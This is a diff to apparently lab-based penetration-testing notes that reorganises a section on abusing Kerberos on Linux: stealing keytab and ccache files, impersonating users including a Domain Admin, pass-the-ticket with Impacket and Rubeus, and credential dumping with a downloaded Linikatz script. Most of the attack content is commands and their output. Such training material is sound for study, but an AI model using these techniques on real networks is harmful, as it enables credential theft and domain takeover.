@@ -4954,22 +4954,6 @@ env | grep -i krb5
 </details>
 
 <details>
-<summary><h5>Backup existing Kerberos Ticket before using a Keytab</h5></summary>
-
-Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.
-
-**1. Create the backup**
-
-```bash
-echo $KRB5CCNAME
-cp "$KRB5CCNAME" /tmp/backup_ccache
-```
-
-This lets you restore the original ticket later, preserving session continuity and credentials.
-
-</details>
-
-<details>
 <summary><h5>Searching for ccache files in /tmp</h5></summary>
 
 Ccache files are located, by default, at `/tmp`.
@@ -5002,12 +4986,31 @@ We can now impersonate the user with kinit.
 </details>
 
 <details>
-<summary><h4>Abusing KeyTab files</h4></summary>
+<summary><h4>3. Backup Existing Tickets (Optional but recommended)</h4></summary>
+
+Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.
+
+**1. Create the backup**
+
+```bash
+echo $KRB5CCNAME
+cp "$KRB5CCNAME" /tmp/backup_ccache
+```
+
+This lets you restore the original ticket later, preserving session continuity and credentials.
+
+</details>
+
+<details>
+<summary><h4>4. Extract Credentials</h4></summary>
 
 A keytab file lists one or more Kerberos principals along with their encrypted secret keys (derived from the user password). To use a keytab file, we need to know which user it was created for.
 
 <details>
-<summary><h5>Option 1: Accessing Domain Shares via Impersonation</h5></summary>
+<summary><h5>Keytab Files</h5></summary>
+
+<details>
+<summary><h6>Option 1: Accessing Domain Shares via Impersonation</h6></summary>
 
 **Verify the current Kerberos ticket**
 
@@ -5028,6 +5031,7 @@ klist
 
 > **Note:** At this point, the active user is david.
 
+---
 
 **Authenticate using the specified keytab, without entering a password.**
 
@@ -5053,6 +5057,8 @@ klist
 
 > **Note:** The active principal is now carlos, indicating the ticket switched successfully.
 
+---
+
 **Connecting to SMB Share as Carlos:**
 
 ```bash
@@ -5072,7 +5078,7 @@ smbclient //dc01/carlos -k -c ls
 </details>
 
 <details>
-<summary><h5>Option 2: Direct Access to Linux Account (Using Password)</h5></summary>
+<summary><h6>Option 2: Direct Access to Linux Account (Using Password)</h6></summary>
 
 We can use KeyTabExtract—a Python script—to extract data from version 0x502 .keytab files used for Kerberos authentication on Linux systems. This script can be found in its [GitHub repository](https://github.com/sosdave/KeyTabExtract) or [`here`](../scripts/passwords/keytabextract.py).
 
@@ -5122,7 +5128,7 @@ The user has a cronjob that uses a KeyTab file named, for example, `svc_workstat
 </details>
 
 <details>
-<summary><h4>Abusing KeyTab ccache</h4></summary>
+<summary><h5>Ccache</h5></summary>
 
 To abuse a `.ccache` file, we only need read access. These files are typically stored in `/tmp` and are readable only by the user who created them. However, if we obtain root access, we can read and leverage these files.
 
@@ -5180,6 +5186,8 @@ ls -la /tmp
 
 If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.
 
+---
+
 **6. Identify group membership**
 
 ```bash
@@ -5192,9 +5200,9 @@ id julio@<DOMAIN>
 # uid=647401106(julio@<DOMAIN>) gid=647400513(domain users@<DOMAIN>) groups=647400513(domain users@<DOMAIN>),647400512(domain admins@<DOMAIN>),647400572(denied rodc password replication group@<DOMAIN>)
 ```
 
----
-
 Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
+
+---
 
 To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
 
@@ -5271,8 +5279,10 @@ smbclient //dc01/C$ -k -c ls -no-pass
 
 </details>
 
+</details>
+
 <details>
-<summary><h4>Using Linux attack tools with Kerberos</h4></summary>
+<summary><h4>5. (Optional) Use Attack Tools with Kerberos</h4></summary>
 
 Many Linux-based attack tools that interact with Windows and Active Directory environments support Kerberos authentication. When using these tools from a domain-joined machine, it's important to set the `KRB5CCNAME` environment variable to point to the correct ccache file.
 
@@ -5378,7 +5388,7 @@ export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
 ---
 
 <details>
-<summary><h5>Impacket</h5></summary>
+<summary><h5>Impacket (with proxychains if needed)</h5></summary>
 
 To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
 
@@ -5500,7 +5510,7 @@ DC01
 </details>
 
 <details>
-<summary><h4>Miscellaneous</h4></summary>
+<summary><h4>6. (Optional) Convert Ticket Formats</h4></summary>
 
 If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
 
@@ -5519,7 +5529,12 @@ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 # [+] done
 ```
 
-**Import kirbi Ticket in Windows Session (Windows-CMD)**
+</details>
+
+<details>
+<summary><h4>7. (Optional) Import Ticket in Windows</h4></summary>
+
+**Step 1: Import Ticket with Rubeus**
 
 ```cmd
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
@@ -5542,7 +5557,7 @@ C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 # [+] Ticket successfully imported!
 ```
 
-**TITLE**
+**Step 2: Verify Ticket with klist**
 
 ```cmd
 klist
@@ -5568,7 +5583,7 @@ klist
 
 ```
 
-**TITLE**
+**Step 3: Access Network Share**
 
 ```cmd
 dir \\dc01\julio
@@ -5592,7 +5607,7 @@ dir \\dc01\julio
 </details>
 
 <details>
-<summary><h4>Linikatz</h4></summary>
+<summary><h4>8. (Optional) Use Linikatz for Automated Extraction</h4></summary>
 
 [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a credential dumping tool developed by Cisco’s security team, designed to exploit Linux systems integrated with Active Directory. It brings the same concept as Mimikatz, but tailored for UNIX environments.
 
@@ -5602,12 +5617,12 @@ Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it e
 
 ```bash
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+chmod +x linikatz.sh
 ```
 
 **Run Linikatz**
 
 ```bash
-chmod +x linikatz.sh
 bash linikatz.sh
 ```
 
